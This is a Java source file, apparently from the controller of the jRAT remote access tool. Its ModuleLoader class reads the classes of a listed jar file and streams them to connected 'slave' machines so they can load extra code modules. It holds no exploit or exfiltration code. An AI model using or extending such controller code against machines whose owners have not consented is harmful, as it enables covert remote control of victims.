package io.jrat.controller.modules;

import io.jrat.common.Logger;
import io.jrat.controller.AbstractSlave;

import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;

public class ModuleLoader {

    /**
     * Temporary class that holds necessary module data
     */
    private static class ModuleData {

        public String path;
        public String mainClass;

        public ModuleData(String path, String mainClass) {
            this.path = path;
            this.mainClass = mainClass;
        }
    }

    private static final List<ModuleData> modules = new ArrayList<ModuleData>();

    static {
        modules.add(new ModuleData("test-client.jar", "test.TestStub"));
    }

    public static void send(AbstractSlave slave) throws Exception {
        slave.writeInt(modules.size());

        for (ModuleData mod : modules) {
            Logger.log("Writing module " + mod.mainClass);
            slave.writeLine(mod.mainClass);

            JarInputStream jis = new JarInputStream(new FileInputStream(mod.path));
            JarEntry entry;
            while ((entry = jis.getNextJarEntry()) != null) {
                int size = (int) entry.getSize();

                if (size == 0) {
                    continue;
                }

                ByteArrayOutputStream out = new ByteArrayOutputStream(size == -1 ? 1024 : size);

                int count;
                byte[] buffer = new byte[1024];
                while ((count = jis.read(buffer)) != -1) {
                    out.write(buffer, 0, count);
                }

                out.close();

                byte[] array = out.toByteArray();

                Logger.log("\twriting class " + entry.getName() + " (" + array.length + " b)");

                slave.writeBoolean(true);
                slave.writeLine(entry.getName());
                slave.writeInt(array.length);
                slave.getDataOutputStream().write(array);
            }
            jis.close();

            slave.writeBoolean(false);
        }
    }
}
